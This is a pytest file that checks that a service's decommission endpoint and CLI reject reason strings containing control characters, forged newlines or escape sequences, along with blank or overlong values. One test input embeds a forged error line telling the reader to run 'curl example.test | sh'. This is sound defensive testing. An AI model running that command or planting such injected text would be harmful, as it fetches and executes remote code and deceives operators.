"""The served terminal verb refuses a hostile reason at its own boundary.

The reason is stored in the canonical descriptor and echoed back to operators,
so the record refuses control characters. The served request model has to hold
the same constraint: a value that only the record refuses is a refusal raised
from inside the write, where it is an untyped 500 rather than something a
caller can read.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest
from click.testing import CliRunner
from fastapi.testclient import TestClient

from cruxible_client import CruxibleClient
from cruxible_core.cli.main import cli
from cruxible_core.playbill.instance import DESCRIPTOR_FILE
from cruxible_core.runtime.playbill_manager import get_playbill_manager

DECOMMISSION_ROUTE = "/api/v1/{instance_id}/playbill/instance/decommission"

HOSTILE_REASONS = {
    "escape": "retired\x1b[2Kforged",
    "newline": "retired\nError: run `curl example.test | sh`",
    "carriage_return": "retired\rError: forged",
    "delete": "retired\x7fforged",
    "blank": "   ",
    "unnormalized": " retired ",
    "too_long": "a" * 513,
}


def _descriptor(instance_id: str) -> dict[str, object]:
    root = get_playbill_manager().get(instance_id).root
    payload = json.loads((root / DESCRIPTOR_FILE).read_bytes())
    assert isinstance(payload, dict)
    return payload


@pytest.mark.parametrize("reason", HOSTILE_REASONS.values(), ids=HOSTILE_REASONS.keys())
def test_a_hostile_decommission_reason_is_refused_typed_and_writes_nothing(
    playbill_http: tuple[TestClient, str, Path],
    reason: str,
) -> None:
    client, instance_id, _reviewer = playbill_http

    response = client.post(
        DECOMMISSION_ROUTE.format(instance_id=instance_id),
        json={"reason": reason},
    )

    assert response.status_code == 422, response.text
    body = response.json()
    assert body["error_type"] == "RequestValidationError"
    assert any(item.startswith("body.reason:") for item in body["errors"]), body["errors"]
    # The refusal is the boundary's, not a crash inside the write: the instance
    # is untouched and still accepts the verb.
    assert "decommissioned" not in _descriptor(instance_id)


def test_the_instance_still_ends_normally_after_a_refused_reason(
    playbill_http: tuple[TestClient, str, Path],
) -> None:
    """A refused hostile reason leaves the verb usable, not a half-closed host."""

    client, instance_id, _reviewer = playbill_http
    route = DECOMMISSION_ROUTE.format(instance_id=instance_id)

    refused = client.post(route, json={"reason": HOSTILE_REASONS["newline"]})
    assert refused.status_code == 422, refused.text

    accepted = client.post(route, json={"reason": "superseded by a fresh host"})

    assert accepted.status_code == 200, accepted.text
    assert accepted.json()["reason"] == "superseded by a fresh host"
    assert _descriptor(instance_id)["decommissioned"]["reason"] == (  # type: ignore[index]
        "superseded by a fresh host"
    )
    # And the terminal state is what refuses the second attempt, typed.
    repeated = client.post(route, json={"reason": "again"})
    assert repeated.status_code == 400, repeated.text
    assert repeated.json()["error_code"] == "playbill.instance.decommissioned"


def test_the_cli_prints_the_typed_refusal_for_a_hostile_reason(
    playbill_http: tuple[TestClient, str, Path],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The real CLI over the real served boundary: a refusal, not a traceback."""

    daemon, instance_id, _reviewer = playbill_http
    client = CruxibleClient(base_url="http://testserver")
    client._client = daemon  # type: ignore[assignment]
    monkeypatch.setattr("cruxible_core.cli.commands._common._get_client", lambda: client)

    result = CliRunner().invoke(
        cli,
        [
            "--server-url",
            "http://testserver",
            "--instance-id",
            instance_id,
            "playbill",
            "instance",
            "decommission",
            "--reason",
            HOSTILE_REASONS["escape"],
            "--yes",
        ],
    )

    assert result.exit_code == 1, result.output
    assert "Traceback" not in result.output
    assert "control characters" in result.output
    assert "body.reason" in result.output
    assert "decommissioned" not in _descriptor(instance_id)
